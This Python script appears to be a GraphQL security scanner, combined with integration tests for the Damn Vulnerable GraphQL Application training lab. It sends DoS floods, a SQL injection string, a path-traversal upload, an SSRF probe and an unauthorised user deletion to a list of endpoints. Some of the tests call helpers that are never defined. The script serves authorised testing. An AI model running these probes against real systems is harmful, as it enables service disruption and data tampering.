import requests
import json


# GRAPHQL_URL = "http://localhost:5013/graphiql"

# Define the GraphQL endpoint URL
def load_endpoints(filename):
    with open(filename, "r") as file:
        for line in file:
            yield json.loads(line)['url']

def print_red(text):
    print("\033[91m{}\033[0m".format(text))

def print_green(text):
    print("\033[92m{}\033[0m".format(text))

def check_resource_request(url):
    resource_query = {
        'query': '''{
            __type(name: "User") {
                name
                fields {
                    name
                    type {
                        name
                        kind
                        ofType {
                            name
                            kind
                        }
                    }
                }
            }
        }'''}

    try:
        response = requests.post(url, json=resource_query)
        response.raise_for_status()
        response_json = response.json()

        if 'data' in response_json and '__type' in response_json['data']:
            print_red("[!] Excessive resource request vulnerability found at {}".format(url))
            print("Evidence:", json.dumps(response_json, indent=4))
        else:
            print_green("[-] No excessive resource request vulnerability found at {}".format(url))
    except Exception as e:
        print("Error during resource request check:", e)

def test_dos_attack():
    query = "query { systemUpdate }" * 100 
    print("Running DoS attack test...")
    try:
        status_codes = []
        for i in range(100):  
            response = requests.post(GRAPHQL_URL, json={"query": query})
            status_codes.append(response.status_code)
        print_green("[+] DoS attack test status codes: {}".format(status_codes))
        if 200 not in status_codes:
            print_green("[+] DoS attack test successful.")
        else:
            print_red("[-] DoS attack test failed: Server responded with 200 status code.")
    except Exception as e:
        print_red("[-] DoS attack test failed: {}".format(e))

def test_alias_attack():
    query_list = []
    for i in range(100):
        alias = f"q{i}: systemUpdate"
        query_list.append(alias)

    query = "\n".join(query_list)
    print("Running alias-based attack test...")
    try:
        status_codes = []
        for i in range(100):  
            response = requests.post(GRAPHQL_URL, json={"query": query})
            status_codes.append(response.status_code)
        print_green("[+] Alias-based attack test status codes: {}".format(status_codes))
        if 200 not in status_codes:
            print_green("[+] Alias-based attack test successful.")
        else:
            print_red("[-] Alias-based attack test failed: Server responded with 200 status code.")

    except Exception as e:
        print_red("[-] Alias-based attack test failed: {}".format(e))

def test_sensitive_data():
    sensitive_fields = [
        'email',
        'password',
        'creditCardNumber',
    ]

    print("Running sensitive data test...")
    try:
        for field in sensitive_fields:
            sensitive_query = {
                'query': f'''
                {{
                    search(query: "{field}") {{
                        id
                        {field}
                    }}
                }}
                '''
            }
            response = requests.post(GRAPHQL_URL, json=sensitive_query)
            response.raise_for_status()
            response_json = response.json()

            if 'data' in response_json and 'search' in response_json['data']:
                print_red("[!] Sensitive data leak detected in field: {}".format(field))
                print("Evidence:", json.dumps(response_json, indent=4))
            else:
                print_green("[-] No sensitive data leak detected in field: {}".format(field))
    except Exception as e:
        print("Error during sensitive data test:", e)

def test_deep_recursion_attack():
    deep_query = 'query { user { friends { friends { friends { id } } } } }'
    try:
        response = requests.post(GRAPHQL_URL, json={"query": deep_query})
        if response.status_code == 200:
            print_red("[-] Deep recursion query handling may be inadequate.")
        else:
            print_green("[+] Server managed deep recursion safely.")
    except Exception as e:
        print_red(f"[-] Deep recursion test failed: {e}")

def test_ssrf_vulnerability():
    # Mutation query attempting to access a potentially private internal service
    ssrf_query = """
    mutation {
      importPaste(host:"localhost", port:8080, path:"/", scheme:"http") {
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': ssrf_query}

    try:
        print("Running SSRF attack test...")
        response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
        if response.status_code == 200:
            print_red("[!] SSRF attack may be possible.")
            print("Response data:", response.json())
        else:
            print_green(f"[-] SSRF attack test failed with status code: {response.status_code}")
    except Exception as e:
        print_red(f"Failed to send SSRF test request: {e}")

def test_sql_injection():
    sql_injection_query = """
    query {
      pastes(filter:"aaa ' or 1=1--") {
          content
          title
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': sql_injection_query}

    try:
        print("Running SQL injection test...")
        response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
        if response.status_code == 200 and 'data' in response.json():
            print_red("[!] SQL injection may be possible.")
            print("Response data:", response.json())
        else:
            print_green(f"[-] SQL injection test did not execute with usual symptoms, status code: {response.status_code}")
    except Exception as e:
        print_red(f"Failed to send SQL injection test request: {e}")


def test_path_traversal():
    path_traversal_query = """
    mutation {
      uploadPaste(filename:"../../../../../tmp/file.txt", content:"hi"){
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': path_traversal_query}

    try:
        print("Running path traversal test...")
        response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get('data') and response_data['data']['uploadPaste']['result']:
                print_red("[!] Path traversal attack may be possible.")
                print("Response data:", response_data)
            else:
                print_green("[-] Path traversal test did not execute successfully, status code: {response.status_code}")
        else:
            print_green(f"[-] Path traversal test failed with status code: {response.status_code}")
    except Exception as e:
        print_red(f"Failed to send path traversal test request: {e}")


def test_permissions():
    sensitive_query = """
    mutation {
      deleteUser(userId: "12345") {
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': sensitive_query}

    print("Running permissions test...")
    response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
    if response.status_code == 403 or response.status_code == 401:
        print_green("[+] Proper authorization checks are in place.")
    else:
        print_red("[-] Permissions test failed, unauthorized actions might be possible.")


def test_introspection():
    introspection_query = """
    query {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
        }
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': introspection_query}

    print("Running introspection test...")
    response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
    if 'types' in response.text:
        print_red("[-] Introspection is enabled and could leak sensitive schema information.")
    else:
        print_green("[+] Introspection is properly restricted.")

def test_capitalize_field_argument():
  query = '''
    query {
      users {
        username(capitalize: true)
      }
    }
    '''
  r = graph_query(GRAPHQL_URL, query)

  assert r.json()['data']['users'][0]['username'] in ('Admin', 'Operator')

def test_show_network_directive():
  query = '''
    query {
      pastes {
          ipAddr @show_network(style:"cidr")
      }
    }
  '''
  r = graph_query(GRAPHQL_URL, query)

  assert r.json()['data']['pastes'][0]['ipAddr'].endswith('/32')

  query = '''
    query {
      pastes {
        ipAddr @show_network(style:"netmask")
      }
    }
  '''
  r = graph_query(GRAPHQL_URL, query)

  assert r.json()['data']['pastes'][0]['ipAddr'].startswith('255.255.')


def test_mutation_login_success():
  query = '''
  mutation {
    login(username: "operator", password:"password123") {
      accessToken
    }
  }
  '''
  r = graph_query(GRAPHQL_URL, query)

  assert r.json()['data']['login']['accessToken']


def test_mutation_login_error():
  query = '''
  mutation {
    login(username: "operator", password:"dolevwashere") {
      accessToken
    }
  }
  '''
  r = graph_query(GRAPHQL_URL, query)

  assert r.json()['errors'][0]['message'] == 'Authentication Failure'


def test_query_me():
  query = '''
  query {
    me(token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU2ODE0OTQ4LCJuYmYiOjE2NTY4MTQ5NDgsImp0aSI6ImI5N2FmY2QwLTUzMjctNGFmNi04YTM3LTRlMjdjODY5MGE2YyIsImlkZW50aXR5IjoiYWRtaW4iLCJleHAiOjE2NTY4MjIxNDh9.-56ZQN9jikpuuhpjHjy3vLvdwbtySs0mbdaSq-9RVGg") {
      id
      username
      password
    }
  }
  '''

  r = graph_query(GRAPHQL_URL, query)

  assert r.json()['data']['me']['id'] == '1'
  assert r.json()['data']['me']['username'] == 'admin'
  assert r.json()['data']['me']['password'] == 'changeme'


def test_query_me_operator():
  query = '''
  query {
    me(token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzIiwiaWF0IjoxNjU2ODE0OTQ4LCJuYmYiOjE2NTY4MTQ5NDgsImp0aSI6ImI5N2FmY2QwLTUzMjctNGFmNi04YTM3LTRlMjdjODY5MGE2YyIsImlkZW50aXR5Ijoib3BlcmF0b3IiLCJleHAiOjE2NTY4MjIxNDh9.iZ-Sifz1WEkcy1CwX4c-rzI-QgfzUMqpWr2oYr8vZ1o") {
      id
      username
      password
    }
  }
  '''

  r = graph_query(GRAPHQL_URL, query)

  assert r.json()['data']['me']['id'] == '2'
  assert r.json()['data']['me']['username'] == 'operator'
  assert r.json()['data']['me']['password'] == '******'

def test_check_graphiql_cookie():
    r = requests.get(URL + '/')
    assert r.status_code == 200
    assert 'env=graphiql:disable' in r.headers.get('Set-Cookie')

def test_check_batch_disabled():
    query = """
        query {
            __typename
        }
    """
    r = requests.post(GRAPHIQL_URL, verify=False, allow_redirects=True, timeout=4, json=[{"query":query}])
    assert not isinstance(r.json(), list)
    assert r.json()['errors'][0]['message'] == 'Batch GraphQL requests are not enabled.'

def test_check_batch_enabled():
    query = """
        query {
            __typename
        }
    """
    r = requests.post(GRAPHQL_URL, verify=False, allow_redirects=True, timeout=4, json=[{"query":query}])
    assert isinstance(r.json(), list)

def test_dvga_is_up():
    """Checks DVGA UI HTML returns correct information"""
    r = requests.get(URL)
    assert 'Damn Vulnerable GraphQL Application' in r.text

def test_graphql_endpoint_up():
    """Checks /graphql is up"""
    r = requests.get(GRAPHQL_URL)
    assert "Must provide query string." in r.json()['errors'][0]['message']

def test_graphiql_endpoint_up():
    """Checks /graphiql is up"""
    r = requests.get(GRAPHIQL_URL)
    assert "Must provide query string." in r.json()['errors'][0]['message']

def test_check_introspect_fields():
    fields = ['pastes', 'paste', 'systemUpdate', 'systemDiagnostics', 'systemDebug', 'systemHealth', 'users', 'readAndBurn', 'search', 'audits', 'deleteAllPastes', 'me']
    r = requests.get(URL + '/difficulty/easy')
    assert r.status_code == 200

    query = """
        query {
        __schema {
            queryType {
              fields {
                name
              }
            }
        }
      }
    """
    r = graph_query(GRAPHQL_URL, query)

    for field in r.json()['data']['__schema']['queryType']['fields']:
        field_name = field['name']
        assert field_name in fields
        assert not field_name not in fields
        fields.remove(field_name)

    assert len(fields) == 0

def test_check_introspect_when_expert_mode():
  query = """
    query {
       __schema {
          __typename
       }
    }
  """
  r = graph_query(GRAPHQL_URL, query, headers={"X-DVGA-MODE":'Expert'})
  assert r.status_code == 200
  assert r.json()['errors'][0]['message'] == '400 Bad Request: Introspection is Disabled'


def test_check_introspect_mutations():
    fields = ['createUser', 'createPaste', 'editPaste', 'login', 'uploadPaste', 'importPaste', 'deletePaste']
    r = requests.get(URL + '/difficulty/easy')
    assert r.status_code == 200

    query = """
        query {
        __schema {
            mutationType {
              fields {
                name
              }
            }
        }
      }
    """
    r = graph_query(GRAPHQL_URL, query)

    for field in r.json()['data']['__schema']['mutationType']['fields']:
        field_name = field['name']
        assert field_name in fields
        assert not field_name not in fields
        fields.remove(field_name)

    assert len(fields) == 0

def test_check_hardened_mode():
    r = requests.get(URL + '/difficulty/hard')
    assert r.status_code == 200

    query = """
        query {
            __schema {
                __typename
            }
        }
    """
    r = graph_query(GRAPHQL_URL, query)
    assert r.json()['errors'][0]['message'] == '400 Bad Request: Introspection is Disabled'

def test_check_easy_mode():
    r = requests.get(URL + '/difficulty/easy')
    assert r.status_code == 200

    query = """
        query {
            __schema {
                __typename
            }
        }
    """
    r = graph_query(GRAPHQL_URL, query)
    assert r.json()['data']['__schema']['__typename'] == '__Schema'

def test_mutation_createPaste():
    query = '''
    mutation {
      createPaste(burn: false, title:"Integration Test", content:"Test", public: false) {
        paste {
        burn
        title
        content
        public
        owner {
            id
            name
          }
        }
      }
    }
    '''
    r = graph_query(GRAPHQL_URL, query)

    assert r.json()['data']['createPaste']['paste']['burn'] == False
    assert r.json()['data']['createPaste']['paste']['title'] == 'Integration Test'
    assert r.json()['data']['createPaste']['paste']['content'] == 'Test'
    assert r.json()['data']['createPaste']['paste']['public'] == False
    assert r.json()['data']['createPaste']['paste']['owner']['id']
    assert r.json()['data']['createPaste']['paste']['owner']['name']

def test_mutation_editPaste():
    query = '''
    mutation {
        editPaste(id: 1, title:"Integration Test123", content:"Integration Test456") {
            paste {
                id
                title
                content
                userAgent
                burn
                ownerId
                owner {
                    id
                    name
                }
            }
        }
    }
    '''
    r = graph_query(GRAPHQL_URL, query)

    assert r.json()['data']['editPaste']['paste']['id'] == '1'
    assert r.json()['data']['editPaste']['paste']['title'] == 'Integration Test123'
    assert r.json()['data']['editPaste']['paste']['content'] == 'Integration Test456'
    assert r.json()['data']['editPaste']['paste']['userAgent']
    assert r.json()['data']['editPaste']['paste']['burn'] == False
    assert r.json()['data']['editPaste']['paste']['ownerId']
    assert r.json()['data']['editPaste']['paste']['owner']['id'] == '1'
    assert r.json()['data']['editPaste']['paste']['owner']['name']

def test_mutation_deletePaste():
    query = '''
        mutation {
            deletePaste(id: 91000) {
                result
            }
        }
    '''
    r = graph_query(GRAPHQL_URL, query)

    assert r.json()['data']['deletePaste']['result'] == False

    query = '''
        mutation {
            deletePaste(id: 5) {
                result
            }
        }
    '''
    r = graph_query(GRAPHQL_URL, query)

    assert r.json()['data']['deletePaste']['result'] == True

def test_mutation_uploadPaste():
    query = '''
        mutation {
            uploadPaste(content:"Uploaded Content", filename:"test.txt") {
                result
            }
        }
    '''
    r = graph_query(GRAPHQL_URL, query)

    assert r.json()['data']['uploadPaste']['result'] == "Uploaded Content"

    query = '''
        query {
            pastes {
                content
            }
        }
    '''
    r = graph_query(GRAPHQL_URL, query)

    found = False
    for i in r.json()['data']['pastes']:
        if i['content'] == 'Uploaded Content':
            found = True

    assert found == True

def test_mutation_importPaste():
    query = '''
        mutation {
            importPaste(scheme: "https", host:"icanhazip.com", path:"/", port:443) {
                 result
            }
        }
    '''
    r = graph_query(GRAPHQL_URL, query)

    assert r.json()['data']['importPaste']['result']
    assert '.' in r.json()['data']['importPaste']['result']

def test_mutation_createUser():
    query = '''
    mutation {
        createUser(userData:{username:"integrationuser", email:"test@blackhatgraphql.com", password:"strongpass"}) {
            user {
             username
            }
        }
    }
    '''
    r = graph_query(GRAPHQL_URL, query)

    assert r.json()['data']['createUser']['user']['username'] == 'integrationuser'

def test_mutation_createBurnPaste():
    query = '''
        mutation {
            createPaste(burn: true, content: "Burn Me", title: "Burn Me", public: true) {
                paste {
                  content
                  burn
                  title
                  id
                }
            }
        }
    '''
    r = graph_query(GRAPHQL_URL, query)

    assert r.status_code == 200
    assert r.json()['data']['createPaste']['paste']['content'] == 'Burn Me'
    assert r.json()['data']['createPaste']['paste']['title'] == 'Burn Me'
    assert r.json()['data']['createPaste']['paste']['id']

    paste_id = r.json()['data']['createPaste']['paste']['id']

    query = '''
        query {
            readAndBurn(id: %s) {
                content
                burn
                title
                id
            }
        }
    ''' % paste_id

    r = graph_query(GRAPHQL_URL, query)

    assert r.status_code == 200
    assert r.json()['data']['readAndBurn']['content'] == 'Burn Me'
    assert r.json()['data']['readAndBurn']['title'] == 'Burn Me'
    assert r.json()['data']['readAndBurn']['id']


    query = '''
        query {
            readAndBurn(id: %s) {
                content
                burn
                title
                id
            }
        }
    ''' % paste_id
    r = graph_query(GRAPHQL_URL, query)

    assert r.status_code == 200
    assert r.json()['data']['readAndBurn'] == None


if __name__ == "__main__":
    endpoints = load_endpoints("valid_endpoints.json")
    for url in endpoints:
        GRAPHQL_URL = url
        print(f"Running test cases on {url}...")
        check_resource_request(url)
        test_dos_attack()
        test_alias_attack()
        test_sensitive_data()
        test_deep_recursion_attack()
        test_ssrf_vulnerability()
        test_sql_injection()
        test_path_traversal()
        test_permissions()
        test_introspection()
        
